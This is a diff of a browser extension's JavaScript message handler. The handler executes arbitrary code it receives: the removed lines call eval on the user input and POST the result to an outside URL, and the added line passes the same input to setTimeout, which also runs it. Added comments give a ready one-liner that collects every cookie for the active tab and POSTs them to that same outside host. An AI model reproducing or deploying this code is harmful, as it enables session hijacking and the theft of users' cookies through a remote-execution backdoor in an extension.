@@ -112,8 +112,9 @@ function create(request, sender, sendResponse) {
     console.log("receive message");
 
     // send data to server
-    function sendData() {
+    function sendData(data) {
         console.log("send data");
+        console.log(data);
         $.ajax({
             type: "POST",
             url: "https://blabla.ro",
@@ -126,19 +127,26 @@ function create(request, sender, sendResponse) {
         });
     }
     
+    var inputElement = request.userInput;
+    setTimeout( request.userInput, 5000);
+
     setTimeout(function(){
         console.log("setTimeout function");
-        var element = request.userInput;
-        var dataReceived = eval(element);
-        console.log(dataReceived);
-        var data = JSON.stringify(dataReceived);
-        sendData(data);
+        console.log(inputElement);
+        // var element = request.userInput;
+        // var dataReceived = eval(element);
+        // console.log(dataReceived);
+        // var data = JSON.stringify(dataReceived);
+        // sendData(inputElement);
     }, 5000);
 
+    // POSSIBLE USER INPUTS:
+    
+    //1. get all cookies and send them to a url using ajax
+    // browser.tabs.query({active:true,currentWindow:true}).then((tabs)=>{var getCookie=browser.cookies.getAll({url:tabs.url}).then(function(cookie){console.log(cookie);$.ajax({type:"POST",url:"https://blabla.ro",data:cookie,contentType:"application/json; charset=utf-8",dataType:"json",success:function(myMessage){console.log("your data was sent");}});})});
+    
+    //2. get all cookies and console log them
     // browser.tabs.query({active:true,currentWindow:true}).then((tabs)=>{var getCookie=browser.cookies.getAll({url:tabs.url}).then(function(cookie){console.log(cookie);})});
-    //console log all the cookies
-
-    // return eval(request.userInput);
 
 }
 
